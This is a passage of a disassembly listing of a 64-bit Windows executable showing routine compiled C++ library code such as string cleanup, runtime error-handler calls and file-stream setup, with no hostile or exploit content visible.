   140004c02:	89 b5 c8 00 00 00    	mov    %esi,0xc8(%rbp)
   140004c08:	ff 15 e2 45 00 00    	call   *0x45e2(%rip)        # 0x1400091f0
   140004c0e:	cc                   	int3
   140004c0f:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004c14:	89 b5 d8 00 00 00    	mov    %esi,0xd8(%rbp)
   140004c1a:	ff 15 d0 45 00 00    	call   *0x45d0(%rip)        # 0x1400091f0
   140004c20:	cc                   	int3
   140004c21:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004c26:	89 b5 e8 00 00 00    	mov    %esi,0xe8(%rbp)
   140004c2c:	ff 15 be 45 00 00    	call   *0x45be(%rip)        # 0x1400091f0
   140004c32:	cc                   	int3
   140004c33:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004c38:	89 b5 f8 00 00 00    	mov    %esi,0xf8(%rbp)
   140004c3e:	ff 15 ac 45 00 00    	call   *0x45ac(%rip)        # 0x1400091f0
   140004c44:	cc                   	int3
   140004c45:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004c4a:	89 b5 08 01 00 00    	mov    %esi,0x108(%rbp)
   140004c50:	ff 15 9a 45 00 00    	call   *0x459a(%rip)        # 0x1400091f0
   140004c56:	cc                   	int3
   140004c57:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004c5c:	89 b5 18 01 00 00    	mov    %esi,0x118(%rbp)
   140004c62:	ff 15 88 45 00 00    	call   *0x4588(%rip)        # 0x1400091f0
   140004c68:	cc                   	int3
   140004c69:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004c6e:	89 b5 28 01 00 00    	mov    %esi,0x128(%rbp)
   140004c74:	ff 15 76 45 00 00    	call   *0x4576(%rip)        # 0x1400091f0
   140004c7a:	cc                   	int3
   140004c7b:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004c80:	89 b5 38 01 00 00    	mov    %esi,0x138(%rbp)
   140004c86:	ff 15 64 45 00 00    	call   *0x4564(%rip)        # 0x1400091f0
   140004c8c:	cc                   	int3
   140004c8d:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004c92:	89 b5 48 01 00 00    	mov    %esi,0x148(%rbp)
   140004c98:	ff 15 52 45 00 00    	call   *0x4552(%rip)        # 0x1400091f0
   140004c9e:	cc                   	int3
   140004c9f:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004ca4:	89 b5 58 01 00 00    	mov    %esi,0x158(%rbp)
   140004caa:	ff 15 40 45 00 00    	call   *0x4540(%rip)        # 0x1400091f0
   140004cb0:	cc                   	int3
   140004cb1:	cc                   	int3
   140004cb2:	cc                   	int3
   140004cb3:	cc                   	int3
   140004cb4:	cc                   	int3
   140004cb5:	cc                   	int3
   140004cb6:	cc                   	int3
   140004cb7:	cc                   	int3
   140004cb8:	cc                   	int3
   140004cb9:	cc                   	int3
   140004cba:	cc                   	int3
   140004cbb:	cc                   	int3
   140004cbc:	cc                   	int3
   140004cbd:	cc                   	int3
   140004cbe:	cc                   	int3
   140004cbf:	cc                   	int3
   140004cc0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004cc5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140004cca:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004ccf:	53                   	push   %rbx
   140004cd0:	56                   	push   %rsi
   140004cd1:	57                   	push   %rdi
   140004cd2:	48 83 ec 30          	sub    $0x30,%rsp
   140004cd6:	48 8b fa             	mov    %rdx,%rdi
   140004cd9:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   140004cde:	48 8b d9             	mov    %rcx,%rbx
   140004ce1:	e8 2a c3 ff ff       	call   0x140001010
   140004ce6:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140004ceb:	4c 8b cf             	mov    %rdi,%r9
   140004cee:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140004cf4:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004cfb:	00 00 
   140004cfd:	48 8b d3             	mov    %rbx,%rdx
   140004d00:	48 8b 08             	mov    (%rax),%rcx
   140004d03:	ff 15 9f 48 00 00    	call   *0x489f(%rip)        # 0x1400095a8
   140004d09:	85 c0                	test   %eax,%eax
   140004d0b:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140004d10:	0f 48 c1             	cmovs  %ecx,%eax
   140004d13:	48 83 c4 30          	add    $0x30,%rsp
   140004d17:	5f                   	pop    %rdi
   140004d18:	5e                   	pop    %rsi
   140004d19:	5b                   	pop    %rbx
   140004d1a:	c3                   	ret
   140004d1b:	cc                   	int3
   140004d1c:	cc                   	int3
   140004d1d:	cc                   	int3
   140004d1e:	cc                   	int3
   140004d1f:	cc                   	int3
   140004d20:	e9 eb 15 00 00       	jmp    0x140006310
   140004d25:	cc                   	int3
   140004d26:	cc                   	int3
   140004d27:	cc                   	int3
   140004d28:	cc                   	int3
   140004d29:	cc                   	int3
   140004d2a:	cc                   	int3
   140004d2b:	cc                   	int3
   140004d2c:	cc                   	int3
   140004d2d:	cc                   	int3
   140004d2e:	cc                   	int3
   140004d2f:	cc                   	int3
   140004d30:	40 53                	rex push %rbx
   140004d32:	48 83 ec 30          	sub    $0x30,%rsp
   140004d36:	48 8b d9             	mov    %rcx,%rbx
   140004d39:	48 8b 09             	mov    (%rcx),%rcx
   140004d3c:	48 85 c9             	test   %rcx,%rcx
   140004d3f:	74 3a                	je     0x140004d7b
   140004d41:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140004d45:	48 2b d1             	sub    %rcx,%rdx
   140004d48:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004d4f:	72 18                	jb     0x140004d69
   140004d51:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004d55:	48 83 c2 27          	add    $0x27,%rdx
   140004d59:	48 2b c8             	sub    %rax,%rcx
   140004d5c:	48 83 e9 08          	sub    $0x8,%rcx
   140004d60:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004d64:	77 1b                	ja     0x140004d81
   140004d66:	48 8b c8             	mov    %rax,%rcx
   140004d69:	e8 72 21 00 00       	call   0x140006ee0
   140004d6e:	33 c0                	xor    %eax,%eax
   140004d70:	48 89 03             	mov    %rax,(%rbx)
   140004d73:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140004d77:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004d7b:	48 83 c4 30          	add    $0x30,%rsp
   140004d7f:	5b                   	pop    %rbx
   140004d80:	c3                   	ret
   140004d81:	33 c0                	xor    %eax,%eax
   140004d83:	45 33 c9             	xor    %r9d,%r9d
   140004d86:	45 33 c0             	xor    %r8d,%r8d
   140004d89:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004d8e:	33 d2                	xor    %edx,%edx
   140004d90:	33 c9                	xor    %ecx,%ecx
   140004d92:	ff 15 38 47 00 00    	call   *0x4738(%rip)        # 0x1400094d0
   140004d98:	cc                   	int3
   140004d99:	cc                   	int3
   140004d9a:	cc                   	int3
   140004d9b:	cc                   	int3
   140004d9c:	cc                   	int3
   140004d9d:	cc                   	int3
   140004d9e:	cc                   	int3
   140004d9f:	cc                   	int3
   140004da0:	40 53                	rex push %rbx
   140004da2:	48 83 ec 30          	sub    $0x30,%rsp
   140004da6:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140004daa:	48 8b d9             	mov    %rcx,%rbx
   140004dad:	48 83 fa 07          	cmp    $0x7,%rdx
   140004db1:	76 31                	jbe    0x140004de4
   140004db3:	48 8b 09             	mov    (%rcx),%rcx
   140004db6:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004dbd:	00 
   140004dbe:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004dc5:	72 18                	jb     0x140004ddf
   140004dc7:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004dcb:	48 83 c2 27          	add    $0x27,%rdx
   140004dcf:	48 2b c8             	sub    %rax,%rcx
   140004dd2:	48 83 e9 08          	sub    $0x8,%rcx
   140004dd6:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004dda:	77 1f                	ja     0x140004dfb
   140004ddc:	48 8b c8             	mov    %rax,%rcx
   140004ddf:	e8 fc 20 00 00       	call   0x140006ee0
   140004de4:	33 c0                	xor    %eax,%eax
   140004de6:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   140004ded:	00 
   140004dee:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004df2:	66 89 03             	mov    %ax,(%rbx)
   140004df5:	48 83 c4 30          	add    $0x30,%rsp
   140004df9:	5b                   	pop    %rbx
   140004dfa:	c3                   	ret
   140004dfb:	33 c0                	xor    %eax,%eax
   140004dfd:	45 33 c9             	xor    %r9d,%r9d
   140004e00:	45 33 c0             	xor    %r8d,%r8d
   140004e03:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004e08:	33 d2                	xor    %edx,%edx
   140004e0a:	33 c9                	xor    %ecx,%ecx
   140004e0c:	ff 15 be 46 00 00    	call   *0x46be(%rip)        # 0x1400094d0
   140004e12:	cc                   	int3
   140004e13:	cc                   	int3
   140004e14:	cc                   	int3
   140004e15:	cc                   	int3
   140004e16:	cc                   	int3
   140004e17:	cc                   	int3
   140004e18:	cc                   	int3
   140004e19:	cc                   	int3
   140004e1a:	cc                   	int3
   140004e1b:	cc                   	int3
   140004e1c:	cc                   	int3
   140004e1d:	cc                   	int3
   140004e1e:	cc                   	int3
   140004e1f:	cc                   	int3
   140004e20:	40 53                	rex push %rbx
   140004e22:	55                   	push   %rbp
   140004e23:	56                   	push   %rsi
   140004e24:	41 56                	push   %r14
   140004e26:	41 57                	push   %r15
   140004e28:	48 83 ec 30          	sub    $0x30,%rsp
   140004e2c:	45 33 ff             	xor    %r15d,%r15d
   140004e2f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004e32:	0f 11 01             	movups %xmm0,(%rcx)
   140004e35:	4c 89 79 10          	mov    %r15,0x10(%rcx)
   140004e39:	48 8b ea             	mov    %rdx,%rbp
   140004e3c:	4c 89 79 18          	mov    %r15,0x18(%rcx)
   140004e40:	48 8b f1             	mov    %rcx,%rsi
   140004e43:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   140004e4a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004e50:	48 ff c3             	inc    %rbx
   140004e53:	66 44 39 3c 5a       	cmp    %r15w,(%rdx,%rbx,2)
   140004e58:	75 f6                	jne    0x140004e50
   140004e5a:	49 be fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%r14
   140004e61:	ff ff 7f 
   140004e64:	49 3b de             	cmp    %r14,%rbx
   140004e67:	0f 87 f6 00 00 00    	ja     0x140004f63
   140004e6d:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   140004e72:	48 83 fb 07          	cmp    $0x7,%rbx
   140004e76:	77 21                	ja     0x140004e99
   140004e78:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   140004e7c:	48 03 db             	add    %rbx,%rbx
   140004e7f:	4c 8b c3             	mov    %rbx,%r8
   140004e82:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140004e89:	00 
   140004e8a:	e8 bc 30 00 00       	call   0x140007f4b
   140004e8f:	66 44 89 3c 33       	mov    %r15w,(%rbx,%rsi,1)
   140004e94:	e9 b6 00 00 00       	jmp    0x140004f4f
   140004e99:	48 8b c3             	mov    %rbx,%rax
   140004e9c:	48 83 c8 07          	or     $0x7,%rax
   140004ea0:	49 3b c6             	cmp    %r14,%rax
   140004ea3:	76 47                	jbe    0x140004eec
   140004ea5:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140004eac:	ff ff 7f 
   140004eaf:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140004eb3:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140004eba:	72 6a                	jb     0x140004f26
   140004ebc:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140004ec0:	48 3b c1             	cmp    %rcx,%rax
   140004ec3:	0f 86 a0 00 00 00    	jbe    0x140004f69
   140004ec9:	48 8b c8             	mov    %rax,%rcx
   140004ecc:	e8 17 20 00 00       	call   0x140006ee8
   140004ed1:	48 85 c0             	test   %rax,%rax
   140004ed4:	75 42                	jne    0x140004f18
   140004ed6:	45 33 c9             	xor    %r9d,%r9d
   140004ed9:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140004ede:	45 33 c0             	xor    %r8d,%r8d
   140004ee1:	33 d2                	xor    %edx,%edx
   140004ee3:	33 c9                	xor    %ecx,%ecx
   140004ee5:	ff 15 e5 45 00 00    	call   *0x45e5(%rip)        # 0x1400094d0
   140004eeb:	cc                   	int3
   140004eec:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140004ef1:	4c 8b f0             	mov    %rax,%r14
   140004ef4:	48 3b c1             	cmp    %rcx,%rax
   140004ef7:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140004efe:	ff ff 7f 
   140004f01:	4c 0f 42 f1          	cmovb  %rcx,%r14
   140004f05:	49 8d 4e 01          	lea    0x1(%r14),%rcx
   140004f09:	48 3b c8             	cmp    %rax,%rcx
   140004f0c:	77 5b                	ja     0x140004f69
   140004f0e:	48 03 c9             	add    %rcx,%rcx
   140004f11:	75 a0                	jne    0x140004eb3
   140004f13:	49 8b ff             	mov    %r15,%rdi
   140004f16:	eb 16                	jmp    0x140004f2e
   140004f18:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140004f1c:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140004f20:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   140004f24:	eb 08                	jmp    0x140004f2e
   140004f26:	e8 bd 1f 00 00       	call   0x140006ee8
   140004f2b:	48 8b f8             	mov    %rax,%rdi
   140004f2e:	48 89 5e 10          	mov    %rbx,0x10(%rsi)
   140004f32:	48 8b d5             	mov    %rbp,%rdx
   140004f35:	48 03 db             	add    %rbx,%rbx
   140004f38:	48 89 3e             	mov    %rdi,(%rsi)
   140004f3b:	4c 8b c3             	mov    %rbx,%r8
   140004f3e:	4c 89 76 18          	mov    %r14,0x18(%rsi)
   140004f42:	48 8b cf             	mov    %rdi,%rcx
   140004f45:	e8 01 30 00 00       	call   0x140007f4b
   140004f4a:	66 44 89 3c 3b       	mov    %r15w,(%rbx,%rdi,1)
   140004f4f:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140004f54:	48 8b c6             	mov    %rsi,%rax
   140004f57:	48 83 c4 30          	add    $0x30,%rsp
   140004f5b:	41 5f                	pop    %r15
   140004f5d:	41 5e                	pop    %r14
   140004f5f:	5e                   	pop    %rsi
   140004f60:	5d                   	pop    %rbp
   140004f61:	5b                   	pop    %rbx
   140004f62:	c3                   	ret
   140004f63:	e8 48 c4 ff ff       	call   0x1400013b0
   140004f68:	cc                   	int3
   140004f69:	e8 22 c3 ff ff       	call   0x140001290
   140004f6e:	cc                   	int3
   140004f6f:	cc                   	int3
   140004f70:	40 53                	rex push %rbx
   140004f72:	48 83 ec 30          	sub    $0x30,%rsp
   140004f76:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140004f7a:	48 8b d9             	mov    %rcx,%rbx
   140004f7d:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004f81:	76 2c                	jbe    0x140004faf
   140004f83:	48 8b 09             	mov    (%rcx),%rcx
   140004f86:	48 ff c2             	inc    %rdx
   140004f89:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004f90:	72 18                	jb     0x140004faa
   140004f92:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004f96:	48 83 c2 27          	add    $0x27,%rdx
   140004f9a:	48 2b c8             	sub    %rax,%rcx
   140004f9d:	48 83 e9 08          	sub    $0x8,%rcx
   140004fa1:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004fa5:	77 21                	ja     0x140004fc8
   140004fa7:	48 8b c8             	mov    %rax,%rcx
   140004faa:	e8 31 1f 00 00       	call   0x140006ee0
   140004faf:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   140004fb6:	00 
   140004fb7:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   140004fbe:	00 
   140004fbf:	c6 03 00             	movb   $0x0,(%rbx)
   140004fc2:	48 83 c4 30          	add    $0x30,%rsp
   140004fc6:	5b                   	pop    %rbx
   140004fc7:	c3                   	ret
   140004fc8:	45 33 c9             	xor    %r9d,%r9d
   140004fcb:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004fd2:	00 00 
   140004fd4:	45 33 c0             	xor    %r8d,%r8d
   140004fd7:	33 d2                	xor    %edx,%edx
   140004fd9:	33 c9                	xor    %ecx,%ecx
   140004fdb:	ff 15 ef 44 00 00    	call   *0x44ef(%rip)        # 0x1400094d0
   140004fe1:	cc                   	int3
   140004fe2:	cc                   	int3
   140004fe3:	cc                   	int3
   140004fe4:	cc                   	int3
   140004fe5:	cc                   	int3
   140004fe6:	cc                   	int3
   140004fe7:	cc                   	int3
   140004fe8:	cc                   	int3
   140004fe9:	cc                   	int3
   140004fea:	cc                   	int3
   140004feb:	cc                   	int3
   140004fec:	cc                   	int3
   140004fed:	cc                   	int3
   140004fee:	cc                   	int3
   140004fef:	cc                   	int3
   140004ff0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004ff5:	55                   	push   %rbp
   140004ff6:	56                   	push   %rsi
   140004ff7:	57                   	push   %rdi
   140004ff8:	48 83 ec 70          	sub    $0x70,%rsp
   140004ffc:	48 8b 05 3d 90 00 00 	mov    0x903d(%rip),%rax        # 0x14000e040
   140005003:	48 33 c4             	xor    %rsp,%rax
   140005006:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000500b:	48 8b da             	mov    %rdx,%rbx
   14000500e:	48 8b f1             	mov    %rcx,%rsi
   140005011:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140005016:	33 ed                	xor    %ebp,%ebp
   140005018:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   14000501c:	48 8d 05 05 51 00 00 	lea    0x5105(%rip),%rax        # 0x14000a128
   140005023:	48 89 01             	mov    %rax,(%rcx)
   140005026:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   14000502d:	ff 15 45 42 00 00    	call   *0x4245(%rip)        # 0x140009278
   140005033:	90                   	nop
   140005034:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   14000503b:	00 
   14000503c:	48 8d 7e 08          	lea    0x8(%rsi),%rdi
   140005040:	45 33 c9             	xor    %r9d,%r9d
   140005043:	45 33 c0             	xor    %r8d,%r8d
   140005046:	48 8b d7             	mov    %rdi,%rdx
   140005049:	48 8b ce             	mov    %rsi,%rcx
   14000504c:	ff 15 7e 41 00 00    	call   *0x417e(%rip)        # 0x1400091d0
   140005052:	90                   	nop
   140005053:	48 8b 06             	mov    (%rsi),%rax
   140005056:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000505a:	48 8d 05 a7 50 00 00 	lea    0x50a7(%rip),%rax        # 0x14000a108
   140005061:	48 89 04 31          	mov    %rax,(%rcx,%rsi,1)
   140005065:	48 8b 06             	mov    (%rsi),%rax
   140005068:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000506c:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140005072:	89 54 31 fc          	mov    %edx,-0x4(%rcx,%rsi,1)
   140005076:	48 8b cf             	mov    %rdi,%rcx
   140005079:	ff 15 c9 41 00 00    	call   *0x41c9(%rip)        # 0x140009248
   14000507f:	48 8d 05 02 50 00 00 	lea    0x5002(%rip),%rax        # 0x14000a088
   140005086:	48 89 07             	mov    %rax,(%rdi)
   140005089:	40 88 6f 7c          	mov    %bpl,0x7c(%rdi)
   14000508d:	40 88 6f 71          	mov    %bpl,0x71(%rdi)
   140005091:	48 8b cf             	mov    %rdi,%rcx
   140005094:	ff 15 be 41 00 00    	call   *0x41be(%rip)        # 0x140009258
   14000509a:	48 89 af 80 00 00 00 	mov    %rbp,0x80(%rdi)
   1400050a1:	48 8b 05 d8 98 00 00 	mov    0x98d8(%rip),%rax        # 0x14000e980
   1400050a8:	48 89 47 74          	mov    %rax,0x74(%rdi)
   1400050ac:	48 89 6f 68          	mov    %rbp,0x68(%rdi)
   1400050b0:	ba 32 00 00 00       	mov    $0x32,%edx
   1400050b5:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   1400050bb:	48 8b cb             	mov    %rbx,%rcx
   1400050be:	ff 15 4c 41 00 00    	call   *0x414c(%rip)        # 0x140009210
   1400050c4:	48 8b d8             	mov    %rax,%rbx
   1400050c7:	48 85 c0             	test   %rax,%rax
   1400050ca:	0f 84 db 00 00 00    	je     0x1400051ab
   1400050d0:	c6 47 7c 01          	movb   $0x1,0x7c(%rdi)
   1400050d4:	40 88 6f 71          	mov    %bpl,0x71(%rdi)
   1400050d8:	48 8b cf             	mov    %rdi,%rcx
   1400050db:	ff 15 77 41 00 00    	call   *0x4177(%rip)        # 0x140009258
   1400050e1:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   1400050e6:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   1400050eb:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   1400050f0:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   1400050f5:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   1400050fa:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400050ff:	48 8b cb             	mov    %rbx,%rcx
   140005102:	ff 15 58 44 00 00    	call   *0x4458(%rip)        # 0x140009560
   140005108:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000510d:	48 89 47 18          	mov    %rax,0x18(%rdi)
   140005111:	48 89 47 20          	mov    %rax,0x20(%rdi)
   140005115:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000511a:	48 89 47 38          	mov    %rax,0x38(%rdi)
   14000511e:	48 89 47 40          	mov    %rax,0x40(%rdi)
   140005122:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140005127:	48 89 47 50          	mov    %rax,0x50(%rdi)
   14000512b:	48 89 47 58          	mov    %rax,0x58(%rdi)
   14000512f:	48 89 9f 80 00 00 00 	mov    %rbx,0x80(%rdi)
   140005136:	48 8b 05 43 98 00 00 	mov    0x9843(%rip),%rax        # 0x14000e980
   14000513d:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140005141:	48 89 6f 68          	mov    %rbp,0x68(%rdi)
   140005145:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000514a:	48 8b cf             	mov    %rdi,%rcx
   14000514d:	ff 15 fd 40 00 00    	call   *0x40fd(%rip)        # 0x140009250
   140005153:	90                   	nop
   140005154:	48 8b c8             	mov    %rax,%rcx
   140005157:	e8 74 10 00 00       	call   0x1400061d0
   14000515c:	48 8b d8             	mov    %rax,%rbx
   14000515f:	48 8b c8             	mov    %rax,%rcx
   140005162:	ff 15 08 40 00 00    	call   *0x4008(%rip)        # 0x140009170
   140005168:	84 c0                	test   %al,%al
   14000516a:	74 06                	je     0x140005172
   14000516c:	48 89 6f 68          	mov    %rbp,0x68(%rdi)
   140005170:	eb 0e                	jmp    0x140005180
   140005172:	48 89 5f 68          	mov    %rbx,0x68(%rdi)
   140005176:	48 8b cf             	mov    %rdi,%rcx
   140005179:	ff 15 d9 40 00 00    	call   *0x40d9(%rip)        # 0x140009258
   14000517f:	90                   	nop
   140005180:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140005185:	48 85 c9             	test   %rcx,%rcx
   140005188:	74 1c                	je     0x1400051a6
   14000518a:	48 8b 01             	mov    (%rcx),%rax
   14000518d:	ff 50 10             	call   *0x10(%rax)
   140005190:	48 85 c0             	test   %rax,%rax
   140005193:	74 11                	je     0x1400051a6
   140005195:	48 8b 08             	mov    (%rax),%rcx
   140005198:	4c 8b 01             	mov    (%rcx),%r8
   14000519b:	ba 01 00 00 00       	mov    $0x1,%edx
   1400051a0:	48 8b c8             	mov    %rax,%rcx
   1400051a3:	41 ff d0             	call   *%r8
   1400051a6:	48 85 ff             	test   %rdi,%rdi
   1400051a9:	75 19                	jne    0x1400051c4
   1400051ab:	48 8b 06             	mov    (%rsi),%rax
   1400051ae:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400051b2:	48 03 ce             	add    %rsi,%rcx
   1400051b5:	45 33 c0             	xor    %r8d,%r8d
   1400051b8:	ba 02 00 00 00       	mov    $0x2,%edx
   1400051bd:	ff 15 ad 40 00 00    	call   *0x40ad(%rip)        # 0x140009270
   1400051c3:	90                   	nop
   1400051c4:	48 8b c6             	mov    %rsi,%rax
   1400051c7:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400051cc:	48 33 cc             	xor    %rsp,%rcx
   1400051cf:	e8 ec 1c 00 00       	call   0x140006ec0
   1400051d4:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   1400051db:	00 
   1400051dc:	48 83 c4 70          	add    $0x70,%rsp
   1400051e0:	5f                   	pop    %rdi
   1400051e1:	5e                   	pop    %rsi
   1400051e2:	5d                   	pop    %rbp
   1400051e3:	c3                   	ret
   1400051e4:	cc                   	int3
   1400051e5:	cc                   	int3
   1400051e6:	cc                   	int3
   1400051e7:	cc                   	int3
   1400051e8:	cc                   	int3
   1400051e9:	cc                   	int3
   1400051ea:	cc                   	int3
   1400051eb:	cc                   	int3
   1400051ec:	cc                   	int3
   1400051ed:	cc                   	int3
   1400051ee:	cc                   	int3
   1400051ef:	cc                   	int3
   1400051f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400051f5:	57                   	push   %rdi
   1400051f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400051fa:	48 8b d9             	mov    %rcx,%rbx
   1400051fd:	48 8b ca             	mov    %rdx,%rcx
   140005200:	e8 cb 0f 00 00       	call   0x1400061d0
   140005205:	48 8b c8             	mov    %rax,%rcx
   140005208:	48 8b f8             	mov    %rax,%rdi
   14000520b:	ff 15 5f 3f 00 00    	call   *0x3f5f(%rip)        # 0x140009170
   140005211:	84 c0                	test   %al,%al
   140005213:	74 13                	je     0x140005228
   140005215:	48 c7 43 68 00 00 00 	movq   $0x0,0x68(%rbx)
   14000521c:	00 
   14000521d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005222:	48 83 c4 20          	add    $0x20,%rsp
   140005226:	5f                   	pop    %rdi
   140005227:	c3                   	ret
   140005228:	48 8b cb             	mov    %rbx,%rcx
   14000522b:	48 89 7b 68          	mov    %rdi,0x68(%rbx)
   14000522f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005234:	48 83 c4 20          	add    $0x20,%rsp
   140005238:	5f                   	pop    %rdi
   140005239:	48 ff 25 18 40 00 00 	rex.W jmp *0x4018(%rip)        # 0x140009258
   140005240:	40 53                	rex push %rbx
   140005242:	48 83 ec 20          	sub    $0x20,%rsp
   140005246:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   14000524d:	00 
   14000524e:	48 8b d9             	mov    %rcx,%rbx
   140005251:	74 2d                	je     0x140005280
   140005253:	48 8b 01             	mov    (%rcx),%rax
   140005256:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000525b:	ff 50 18             	call   *0x18(%rax)
   14000525e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005261:	74 1d                	je     0x140005280
   140005263:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   14000526a:	ff 15 58 43 00 00    	call   *0x4358(%rip)        # 0x1400095c8
   140005270:	33 c9                	xor    %ecx,%ecx
   140005272:	85 c0                	test   %eax,%eax
   140005274:	0f 99 c1             	setns  %cl
   140005277:	8d 41 ff             	lea    -0x1(%rcx),%eax
   14000527a:	48 83 c4 20          	add    $0x20,%rsp
   14000527e:	5b                   	pop    %rbx
   14000527f:	c3                   	ret
   140005280:	33 c0                	xor    %eax,%eax
   140005282:	48 83 c4 20          	add    $0x20,%rsp
   140005286:	5b                   	pop    %rbx
   140005287:	c3                   	ret
   140005288:	cc                   	int3
   140005289:	cc                   	int3
   14000528a:	cc                   	int3
   14000528b:	cc                   	int3
   14000528c:	cc                   	int3
   14000528d:	cc                   	int3
   14000528e:	cc                   	int3
   14000528f:	cc                   	int3
   140005290:	40 53                	rex push %rbx
   140005292:	56                   	push   %rsi
   140005293:	48 83 ec 48          	sub    $0x48,%rsp
   140005297:	48 8b 05 a2 8d 00 00 	mov    0x8da2(%rip),%rax        # 0x14000e040
   14000529e:	48 33 c4             	xor    %rsp,%rax
   1400052a1:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400052a6:	33 f6                	xor    %esi,%esi
   1400052a8:	4d 8b c8             	mov    %r8,%r9
   1400052ab:	48 8b d9             	mov    %rcx,%rbx
   1400052ae:	48 85 d2             	test   %rdx,%rdx
   1400052b1:	75 0b                	jne    0x1400052be
   1400052b3:	4d 85 c0             	test   %r8,%r8
   1400052b6:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400052bc:	74 03                	je     0x1400052c1
   1400052be:	44 8b c6             	mov    %esi,%r8d
   1400052c1:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   1400052c8:	48 85 c9             	test   %rcx,%rcx
   1400052cb:	0f 84 9e 00 00 00    	je     0x14000536f
   1400052d1:	ff 15 99 42 00 00    	call   *0x4299(%rip)        # 0x140009570
   1400052d7:	85 c0                	test   %eax,%eax
